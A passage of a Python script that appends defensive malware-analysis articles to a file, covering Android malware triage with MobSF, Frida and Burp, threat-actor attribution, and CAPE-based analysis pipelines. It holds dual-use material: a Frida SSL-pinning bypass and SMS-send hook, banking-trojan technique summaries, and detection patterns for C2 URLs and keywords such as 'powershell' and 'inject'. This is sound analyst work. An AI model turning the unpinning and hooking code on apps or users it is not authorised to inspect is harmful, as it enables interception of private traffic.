SmsMessage.createFromPdu()
getMessageBody()

// Keylogging via accessibility
onAccessibilityEvent(AccessibilityEvent event)
event.getSource().getText()

// Reflection (obfuscation/dynamic loading)
Class.forName("android.telephony.SmsManager")
Method.invoke()
DexClassLoader  // loading additional DEX from assets/network
```

**MobSF** (automated static + dynamic):
```bash
docker pull opensecurity/mobile-security-framework-mobsf
docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest
# Upload APK via web UI at http://localhost:8000
```

## Dynamic Analysis

### Emulator Setup

```bash
# Create Android emulator with writable system
avdmanager create avd -n malware_analysis -k "system-images;android-29;google_apis;x86_64"
emulator -avd malware_analysis -writable-system -no-snapshot

# Install malware APK
adb install malware.apk

# Root the emulator (for Frida)
adb root
adb remount
```

### Frida Hooking

Frida instruments running apps without source code modification:

```bash
# Install Frida server on emulator
adb push frida-server-16.0.0-android-x86 /data/local/tmp/frida-server
adb shell chmod 755 /data/local/tmp/frida-server
adb shell /data/local/tmp/frida-server &

# List running apps
frida-ps -U

# Hook all network requests
frida -U -l intercept_http.js com.malware.sample
```

**intercept_http.js** — SSL unpinning + traffic interception:
```javascript
Java.perform(function() {
    // Bypass SSL pinning
    var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
    var SSLContext = Java.use('javax.net.ssl.SSLContext');

    var TrustManager = Java.registerClass({
        name: 'com.custom.TrustManager',
        implements: [X509TrustManager],
        methods: {
            checkClientTrusted: function(chain, authType) {},
            checkServerTrusted: function(chain, authType) {},
            getAcceptedIssuers: function() { return []; }
        }
    });

    var TrustManagers = [TrustManager.$new()];
    var SSLContextInstance = SSLContext.getInstance('TLS');
    SSLContextInstance.init(null, TrustManagers, null);
    SSLContext.getDefault.implementation = function() {
        return SSLContextInstance;
    };

    // Hook URL.openConnection
    var URL = Java.use('java.net.URL');
    URL.openConnection.implementation = function() {
        console.log('[HTTP] Connecting to: ' + this.toString());
        return this.openConnection();
    };
});
```

**SMS interception hook**:
```javascript
Java.perform(function() {
    var SmsManager = Java.use('android.telephony.SmsManager');
    SmsManager.sendTextMessage.implementation = function(dest, sc, text, sent, delivered) {
        console.log('[SMS] To: ' + dest + ' Text: ' + text);
        // Don't call original to block send: return;
        return this.sendTextMessage(dest, sc, text, sent, delivered);
    };
});
```

### Traffic Capture

```bash
# Route emulator traffic through Burp Suite proxy
emulator -avd malware_analysis -http-proxy 127.0.0.1:8080

# Install Burp CA certificate
adb push burp_ca.der /sdcard/Download/burp_ca.der
# Install via Settings > Security > Install certificate

# Capture with tcpdump on device
adb shell tcpdump -i wlan0 -w /sdcard/capture.pcap
adb pull /sdcard/capture.pcap
```

## Banking Trojan Patterns

Common behaviors:
- **Overlay attacks**: Draws transparent window over banking app to capture credentials
- **SMS stealer**: Intercepts OTP SMS messages and forwards to C2
- **Keylogging**: Uses `AccessibilityService` to read all text input
- **Screen recording**: `MediaProjection` API

Detecting overlays in code:
```java
// WindowManager with TYPE_SYSTEM_OVERLAY or TYPE_PHONE
WindowManager.LayoutParams params = new WindowManager.LayoutParams(
    WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
);
```

## IOC Extraction

After analysis, extract:
```bash
# Network IOCs from decompiled code
grep -r "http\|https\|ftp" jadx_output/ | grep -oE "https?://[^'\"]*" | sort -u

# C2 IP/domain from strings
strings classes.dex | grep -E "([0-9]{1,3}\\.){3}[0-9]|[a-z0-9-]+\\.(xyz|top|ru|cn)/(gate|panel|bot)"

# Crypto keys (hardcoded)
grep -r "AES\|RC4\|DES\|key\s*=\s*\"" jadx_output/ --include="*.java"

# Package name, version, certificate hash
aapt dump badging malware.apk | grep -E "package|versionName"
```
""",
    },
    {
        "title": "Threat Actor Attribution — Technical Indicators and Methodology",
        "tags": ["attribution", "threat-intelligence", "ttps", "mitre-attack", "iocs"],
        "content": """Attribution connects malware or intrusion activity to a specific threat actor, nation-state, or criminal group. Technical attribution uses overlapping IOCs, TTPs, code similarities, infrastructure reuse, and language artifacts.

## Attribution Evidence Hierarchy

From most to least reliable:

1. **Code overlaps**: Identical or near-identical functions across samples
2. **Infrastructure overlap**: Shared C2 domains, IP addresses, certificates
3. **TTP overlap**: Same attack chain, same tooling, same target sectors
4. **Metadata artifacts**: Compile times, PDB paths, error messages, language settings
5. **Operational patterns**: Attack timing (suggests timezone), target selection

Public attribution should only be made at high confidence with multiple overlapping indicators.

## Code Similarity Analysis

**BinDiff** (function-level binary diff):
```
# Export BinDiff from IDA Pro
File → Export → BinExport → sample_A.BinExport
# Compare in BinDiff GUI
# Similarity score > 0.8 on non-trivial functions = strong overlap
```

**TLSH** (Trend Micro Locality Sensitive Hash) — fuzzy hash for finding similar files:
```python
import tlsh
hash_a = tlsh.hash(open('sample_a.exe', 'rb').read())
hash_b = tlsh.hash(open('sample_b.exe', 'rb').read())
score = tlsh.diff(hash_a, hash_b)
print(f"TLSH distance: {score}")  # 0 = identical, < 100 = likely related
```

**ssdeep** for fuzzy file similarity:
```bash
ssdeep sample_a.exe > hashes.txt
ssdeep -m hashes.txt sample_b.exe
# Match threshold: > 50 = similar
```

**Capa** for behavioral similarity:
```bash
capa sample_a.exe -j > capa_a.json
capa sample_b.exe -j > capa_b.json
# Compare capability sets — if both have same rare capabilities (e.g., "modify DNS settings" + "inject into lsass"), strong overlap
```

## Infrastructure Analysis

```bash
# Passive DNS — historical resolutions for C2 domain
curl "https://api.passivetotal.org/v2/dns/passive?query=c2.example.com" \
  -u "$PT_USER:$PT_KEY"

# Certificate transparency — find related domains
curl "https://crt.sh/?q=%.maliciousdomain.com&output=json" | jq '.[].name_value'

# WHOIS registration pattern
whois c2-domain.com | grep -E "Registrar|Registrant|Created|Updated|Emails"
# Same registrar + registration date cluster = infrastructure batch

# Shodan — find other servers with same certificate or banner
shodan search "ssl.cert.fingerprint:AA:BB:CC..."
shodan search "http.html_hash:<hash>"  # same web framework/panel fingerprint

# VirusTotal graph — visualize infrastructure connections
# vt graph create --name "Attribution Analysis"
```

## Compile Time and Metadata

```bash
# PE compile timestamp (can be falsified but often isn't)
python3 -c "
import pefile, datetime
pe = pefile.PE('sample.exe')
ts = pe.FILE_HEADER.TimeDateStamp
print(datetime.datetime.utcfromtimestamp(ts))
"

# PDB path reveals development environment
strings sample.exe | grep -i "\.pdb"
# Example: c:\users\developer\documents\rat_v2\release\client.pdb
# Username, project name visible

# Rich header — compiler version, object file count
python3 -c "
import pefile
pe = pefile.PE('sample.exe')
rich_header = pe.parse_rich_header()
if rich_header:
    for entry in rich_header['values']:
        print(f'Tool: {entry[0]}, Count: {entry[1]}')
"
# Consistent Rich header across samples = same build environment
```

## Language and Cultural Artifacts

```bash
# Error messages, strings, comments in non-English
strings sample.exe | grep -P "[^\x00-\x7F]"  # non-ASCII
strings -e l sample.exe  # little-endian 16-bit (Unicode)

# Resource language ID
python3 -c "
import pefile
pe = pefile.PE('sample.exe')
for rsrc in pe.DIRECTORY_ENTRY_RESOURCE.entries:
    for entry in rsrc.directory.entries:
        for lang_entry in entry.directory.entries:
            print(f'Language: {lang_entry.data.lang}, Sublanguage: {lang_entry.data.sublang}')
"
# LANG_CHINESE (0x04), LANG_RUSSIAN (0x19), LANG_KOREAN (0x12), etc.

# Keyboard layout artifact in binary
# Some malware checks keyboard layout for self-exclusion
strings sample.exe | grep -oE "0x04[0-9A-F]{2}"  # LANGID hex values
```

## Known Threat Actor Technical Signatures

**APT29 (Cozy Bear)**:
- Custom implant: SUNBURST, WellMess, BEATDROP
- Technique: steganography in images for C2 comms
- Infrastructure: compromised legitimate websites as C2
- Code: heavy use of legitimate cloud services (Dropbox, OneDrive) as C2 channels

**Lazarus Group (DPRK)**:
- Custom wipers: WhiskeyAlpha, TraderTraitor
- Cryptocurrency theft focus
- WIZVERA supply chain attack pattern
- Code reuse: RC4 implementation with identical key scheduling

**APT41 (Winnti)**:
- Supply chain via software updaters
- Dual espionage + financial motivation
- Shared infrastructure with APT40
- Rootkit: WINNKIT, DEEPDIVE

## MITRE ATT&CK Mapping

Map technical findings to ATT&CK for attribution comparison:

```python
from mitreattack.stix20 import MitreAttackData

attack = MitreAttackData("enterprise-attack.json")

# Find techniques by software name
software = attack.get_software_by_name("Cobalt Strike")
techniques = attack.get_techniques_used_by_software(software[0].id)
for tech in techniques:
    print(f"{tech['technique'].external_id}: {tech['technique'].name}")
```

Use ATT&CK Navigator to overlay two actors' technique sets and identify overlaps.

## Attribution Pitfalls

**False flag operations**: Nation-states deliberately plant false evidence:
- Lazarus used code from APT3 Chinese tooling
- Olympic Destroyer used code from APT1, Sandworm, Lazarus simultaneously

**Shared infrastructure**: Criminal infrastructure (bulletproof hosting, VPN exit nodes) is reused by multiple actors.

**Public tooling**: Cobalt Strike, Metasploit, and open-source RATs are used by hundreds of groups — do not attribute based on tool alone.

**Stolen code**: Advanced actors steal and reuse victim code or other actors' tools.

**Principle of least attribution**: Attribute to the minimum specificity supported by evidence — "nation-state aligned actor targeting financial sector" before "APT-XX".

## Documenting Attribution

Attribution report structure:
1. Executive summary with confidence level (Low/Medium/High)
2. Technical indicators with evidence (hashes, network IOCs, code snippets)
3. Methodology (tools used, analysis steps)
4. Overlap with known actors (with specific evidence for each overlap)
5. Alternative hypotheses considered
6. Confidence assessment and limitations
""",
    },
    {
        "title": "Automated Malware Analysis Pipelines",
        "tags": ["automation", "sandbox", "cuckoo", "cape", "yara", "pipeline"],
        "content": """A malware analysis pipeline automates initial triage, enabling analysts to process large sample volumes, prioritize high-value investigations, and build detection content systematically.

## Pipeline Architecture

```
Sample Intake → Detonation (sandbox) → Static Analysis → IOC Extraction
     ↓                ↓                      ↓                ↓
  Hashing         Behavioral           PE Analysis        YARA scan
  Dedup           Report               Strings            Network IOCs
  Queuing         Screenshots          Imports            File IOCs
                  Network PCAP         Entropy
                                       Packing detection
```

## CAPE Sandbox Deployment

CAPE (Config And Payload Extraction) extends Cuckoo with malware config extraction:

```bash
# Docker deployment
git clone https://github.com/kevoreilly/CAPEv2.git
cd CAPEv2
# Edit conf/cuckoo.conf, conf/reporting.conf
docker-compose up -d

# Submit sample via API
curl -X POST http://localhost:8000/apiv2/tasks/create/file/ \
  -F file=@malware.exe \
  -F options="procmemdump=1,fake-rdtsc=1"

# Check task
curl http://localhost:8000/apiv2/tasks/view/1/

# Get report
curl http://localhost:8000/apiv2/tasks/report/1/json/ -o report.json
```

## Python Integration

```python
import requests
import hashlib
import json
import time

CAPE_URL = "http://localhost:8000"

def submit_sample(filepath):
    """Submit sample to CAPE and return task ID."""
    with open(filepath, 'rb') as f:
        resp = requests.post(
            f"{CAPE_URL}/apiv2/tasks/create/file/",
            files={"file": f},
            data={"options": "procmemdump=1", "priority": 2}
        )
    return resp.json()["data"]["task_ids"][0]

def wait_for_report(task_id, timeout=300):
    """Poll until task completes."""
    deadline = time.time() + timeout
    while time.time() < deadline:
        r = requests.get(f"{CAPE_URL}/apiv2/tasks/view/{task_id}/").json()
        if r["data"]["status"] == "reported":
            return requests.get(f"{CAPE_URL}/apiv2/tasks/report/{task_id}/json/").json()
        time.sleep(10)
    raise TimeoutError(f"Task {task_id} did not complete")

def extract_iocs(report):
    """Extract IOCs from CAPE report."""
    iocs = {
        "network": {
            "domains": [d["domain"] for d in report.get("network", {}).get("domains", [])],
            "hosts": report.get("network", {}).get("hosts", []),
            "http_requests": [r["uri"] for r in report.get("network", {}).get("http", [])],
        },
        "files": {
            "created": [f["path"] for f in report.get("behavior", {}).get("summary", {}).get("files", []) if f.get("type") == "created"],
            "deleted": [f["path"] for f in report.get("behavior", {}).get("summary", {}).get("files", []) if f.get("type") == "deleted"],
        },
        "registry": report.get("behavior", {}).get("summary", {}).get("keys", []),
        "processes": [p["process_name"] for p in report.get("behavior", {}).get("processes", [])],
        "config": report.get("CAPE", {}).get("configs", []),
    }
    return iocs
```

## YARA Rule Generation from Sandbox Output

```python
import yara
import pefile
from collections import Counter

def generate_yara_from_pe(filepath, rule_name):
    """Generate YARA rule from PE file characteristics."""
    pe = pefile.PE(filepath)

    # Extract unique imports
    imports = []
    if hasattr(pe, 'DIRECTORY_ENTRY_IMPORT'):
        for lib in pe.DIRECTORY_ENTRY_IMPORT:
            for imp in lib.imports:
                if imp.name:
                    imports.append(imp.name.decode())

    # Find interesting strings
    with open(filepath, 'rb') as f:
        data = f.read()

    # Extract printable strings > 8 chars
    import re
    strings = re.findall(b'[\\x20-\\x7E]{8,}', data)
    # Filter to interesting ones
    interesting = [s.decode() for s in strings if any(kw in s.lower() for kw in [b'http', b'cmd', b'powershell', b'.dll', b'inject', b'token'])]

    # Build rule
    rule_text = f'''rule {rule_name} {{
    meta:
        description = "Auto-generated from {filepath}"
    strings:
'''
    for i, s in enumerate(interesting[:5]):
        rule_text += f'        $s{i} = "{s}" nocase\n'

    rule_text += f'''    condition:
        uint16(0) == 0x5A4D and
        filesize < 5MB and
        3 of ($s*)
}}'''

    return rule_text
```

## VirusTotal Integration

```python
import vt  # pip install vt-py

async def vt_lookup(hash_sha256, api_key):
    """Look up file hash in VirusTotal."""
    async with vt.Client(api_key) as client:
        try:
            file_obj = await client.get_object_async(f"/files/{hash_sha256}")
            return {
                "detection_ratio": f"{file_obj.last_analysis_stats['malicious']}/{sum(file_obj.last_analysis_stats.values())}",
                "first_submission": str(file_obj.first_submission_date),
                "meaningful_name": file_obj.meaningful_name,
                "tags": file_obj.tags,
                "sigma_analysis": file_obj.sigma_analysis_stats,
            }
        except vt.error.APIError as e:
            if e.code == "NotFoundError":
                return {"status": "not_found"}
            raise
```

## MISP Integration

```python
from pymisp import PyMISP, MISPEvent, MISPAttribute

misp = PyMISP("https://misp.internal", "YOUR_API_KEY", ssl=False)

def create_malware_event(iocs, sample_hash, family_name):
    """Push analysis results to MISP as an event."""
    event = MISPEvent()
    event.info = f"Malware Analysis: {family_name}"
    event.distribution = 1  # Community
    event.threat_level_id = 2  # High

    # Add file hash
    event.add_attribute("md5", iocs.get("md5", ""), category="Payload delivery")
    event.add_attribute("sha256", sample_hash, category="Payload delivery")

    # Add network IOCs
    for domain in iocs["network"]["domains"]:
        event.add_attribute("domain", domain, category="Network activity", to_ids=True)

    for ip in iocs["network"]["hosts"]:
        event.add_attribute("ip-dst", ip, category="Network activity", to_ids=True)

    result = misp.add_event(event)
    return result.id
```

## Triage Scoring

```python
SCORE_WEIGHTS = {
    "network_connections": 5,
    "dns_queries": 2,
    "process_injection": 20,
    "registry_persistence": 15,
    "file_dropped_exe": 10,
    "anti_analysis": 15,
    "credential_access": 25,
    "lateral_movement_api": 20,
    "ransomware_behavior": 50,
    "config_extracted": 30,
}

def triage_score(report):
    """Score a CAPE report for analyst prioritization."""
    score = 0
    reasons = []

    behavior = report.get("behavior", {}).get("summary", {})

    if report.get("network", {}).get("domains"):
        score += SCORE_WEIGHTS["network_connections"]
        reasons.append(f"C2 DNS: {len(report['network']['domains'])} domains")

    if report.get("CAPE", {}).get("configs"):
        score += SCORE_WEIGHTS["config_extracted"]
        reasons.append("Malware config extracted")

    for sig in report.get("signatures", []):
        if "injection" in sig["name"].lower():
            score += SCORE_WEIGHTS["process_injection"]
            reasons.append(f"Injection: {sig['name']}")
        if "ransomware" in sig["name"].lower():
            score += SCORE_WEIGHTS["ransomware_behavior"]
            reasons.append(f"Ransomware: {sig['name']}")

    return {"score": min(score, 100), "reasons": reasons,
            "priority": "HIGH" if score >= 50 else "MEDIUM" if score >= 20 else "LOW"}
```

## Pipeline Orchestration

```python
# Simple pipeline runner
from pathlib import Path

def analyze_directory(sample_dir, output_dir):
    """Process all samples in a directory."""
    results = []
    for sample in Path(sample_dir).glob("*"):
        if sample.suffix.lower() not in ['.exe', '.dll', '.ps1', '.docm', '.xlsm', '.pdf']:
            continue

        sha256 = hashlib.sha256(sample.read_bytes()).hexdigest()
        print(f"Analyzing {sample.name} ({sha256[:8]}...)")

        # Submit and wait
        task_id = submit_sample(str(sample))
        report = wait_for_report(task_id)

        # Extract IOCs and score
        iocs = extract_iocs(report)
        score = triage_score(report)

        # Save results
        result = {"sha256": sha256, "filename": sample.name, "iocs": iocs, "triage": score}
        results.append(result)

        out_path = Path(output_dir) / f"{sha256}.json"
        out_path.write_text(json.dumps(result, indent=2))

        # Alert on high-priority findings
        if score["priority"] == "HIGH":
            print(f"HIGH PRIORITY: {sample.name} - {score['reasons']}")

    return results
```
""",
    },
]
'''

with open(OUTPUT, "a", encoding="utf-8") as f:
    f.write(MALWARE_ADVANCED)

# Count lines
with open(OUTPUT, "r", encoding="utf-8") as f:
    lines = f.readlines()
print(f"Collection 6 written. Lines: {len(lines)}")
